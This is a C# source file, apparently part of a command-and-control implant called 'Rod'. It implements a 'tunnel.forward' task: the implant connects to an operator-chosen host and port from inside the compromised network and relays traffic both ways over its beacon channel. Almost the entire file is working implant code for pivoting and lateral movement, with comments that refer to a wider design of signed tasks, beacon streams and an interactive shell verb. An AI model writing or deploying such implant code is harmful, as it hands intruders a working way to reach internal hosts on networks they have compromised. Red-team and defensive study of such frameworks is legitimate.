using System.Net.Sockets;
using System.Threading.Channels;
using Rod.V1;

namespace Rod.Implant.Internal;

// The tunnel verbs' implant half (architecture.md Sec 5.2, Sec 14): the
// tunnel.forward handler. Where shell.interact wires the platform shell's
// stdio to a live channel, tunnel.forward wires a TCP connection to one --
// the operator's bytes flow in as ChannelInput frames and are relayed to a
// host reachable only from this implant's vantage, whose answers stream back
// as ChannelOutput chunks on the same beacon stream, until the peer closes
// and the task completes through an ordinary TaskResult.
//
// The channel is byte-transparent, so the relayed protocol is none of the
// handler's business: it pumps bytes, and the traffic's attribution is the
// task's own record -- every byte crossed the channel the signed TaskRequest
// opened. The operator's eof is the TCP shape of half-close: the send side
// shuts down and answers already in flight still land; the tunnel ends when
// the peer closes (or the beacon stream dies, which kills it with the
// channel -- the session-scoped lifetime every channel verb shares).

/// <summary>
/// The port-forward handler: connects to <c>&lt;host&gt; &lt;port&gt;</c> from
/// the implant's own vantage and bridges the task's channel to the socket
/// both ways until the peer closes, the operator's input half closes, or
/// <paramref name="cancellationToken"/> fires (the beacon stream ended; the
/// tunnel dies with the channel).
/// </summary>
internal static class TunnelForward
{
    // The down pump's read buffer: one read is one output chunk, the same
    // budget the interactive shell's output pumps use -- well inside the
    // frame-layer sizing with protobuf overhead to spare.
    private const int OutputChunkBytes = 16 * 1024;

    // How long the outbound connect may take before the tunnel is refused: a
    // blackholed host must fail the task, not park the channel until the
    // stream dies.
    private static readonly TimeSpan ConnectTimeout = TimeSpan.FromSeconds(10);

    /// <summary>
    /// Runs the tunnel on <paramref name="stream"/> until the peer closes or
    /// the channel ends, and returns the outcome with the relay summary as the
    /// task's final output.
    /// </summary>
    public static async Task<(TaskOutcome Outcome, string Output)> RunAsync(
        string arguments,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        if (!TryParseArgs(arguments, out var host, out var port))
            return (TaskOutcome.Failed, "tunnel.forward expects '<host> <port>'");

        using var client = new TcpClient();
        try
        {
            using var connect = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            connect.CancelAfter(ConnectTimeout);
            await client.ConnectAsync(host, port, connect.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return (TaskOutcome.Failed, $"connect to {host}:{port} timed out");
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, $"connect to {host}:{port} failed: {ex.Message}");
        }

        long up = 0;
        long down = 0;
        try
        {
            // The input pump parks on operator input that may never come once
            // the tunnel is over, so it reads on its own token: the peer ending
            // releases it instead of parking it forever on a dead tunnel.
            using var inputDone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            var upPump = PumpUpAsync(client, stream, inputDone.Token);
            var downPump = PumpDownAsync(client, stream, cancellationToken);
            try
            {
                // The tunnel ends with the peer: the down pump returns when the
                // third host closes its side (or the socket faults under it).
                down = await downPump;
            }
            finally
            {
                // Close the socket and release the input pump so neither side of
                // the bridge can hold the task open past the peer's end; the
                // pumps' counts and last gated writes drain here.
                inputDone.Cancel();
                client.Close();
                up = await upPump;
            }
        }
        catch (OperationCanceledException)
        {
            return (TaskOutcome.Failed, "channel closed: the beacon stream ended");
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }

        return (TaskOutcome.Succeeded,
            $"tunnel to {host}:{port} closed: relayed {up} bytes up, {down} bytes down");
    }

    // The up pump: operator input into the socket. Eof half-closes the send
    // side -- the TCP shape of the operator's stdin ending, with the peer's
    // answers still free to land -- and the pump returns without ending the
    // tunnel. Returns the bytes relayed up.
    private static async Task<long> PumpUpAsync(
        TcpClient client,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        long written = 0;
        var socket = client.GetStream();
        while (true)
        {
            byte[]? data;
            bool eof;
            try
            {
                (data, eof) = await stream.ReadInputAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return written; // The tunnel is over; nobody reads what we would relay.
            }
            catch (ChannelClosedException)
            {
                return written; // The channel host completed the input; nothing more comes.
            }

            if (data is { Length: > 0 })
            {
                try
                {
                    await socket.WriteAsync(data, CancellationToken.None);
                }
                catch (Exception ex) when (ex is IOException or SocketException or ObjectDisposedException)
                {
                    return written; // The peer is gone; the down pump ends the tunnel.
                }
                written += data.Length;
            }

            if (eof)
            {
                try { client.Client.Shutdown(SocketShutdown.Send); }
                catch (Exception ex) when (ex is SocketException or ObjectDisposedException)
                {
                    // Already closed; the down pump owns the ending.
                }
                return written;
            }
        }
    }

    // The down pump: the socket's answers streamed upstream as output chunks,
    // one read per chunk. The await on WriteOutputAsync is the backpressure --
    // a slow stream slows the pump, so the socket's own buffer is the only
    // buffering. Returns the bytes relayed down.
    private static async Task<long> PumpDownAsync(
        TcpClient client,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        long read = 0;
        var socket = client.GetStream();
        var buffer = new byte[OutputChunkBytes];
        while (true)
        {
            int received;
            try
            {
                received = await socket.ReadAsync(buffer, cancellationToken);
            }
            catch (Exception ex) when (ex is IOException or SocketException or ObjectDisposedException)
            {
                return read; // The socket faulted; the tunnel is over.
            }
            if (received <= 0)
                return read; // Socket EOF: the peer closed; the tunnel's natural end.
            read += received;
            await stream.WriteOutputAsync(buffer.AsMemory(0, received), cancellationToken);
        }
    }

    // The arguments grammar: '<host> <port>', any whitespace separation, the
    // port a plain TCP port number. The verb's grammar is its own -- parsed
    // here, never by the server (architecture.md Sec 10).
    private static bool TryParseArgs(string arguments, out string host, out int port)
    {
        host = string.Empty;
        port = 0;
        var parts = arguments.Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length != 2)
            return false;
        if (!int.TryParse(parts[1], out port) || port is < 1 or > 65535)
            return false;
        host = parts[0];
        return true;
    }
}
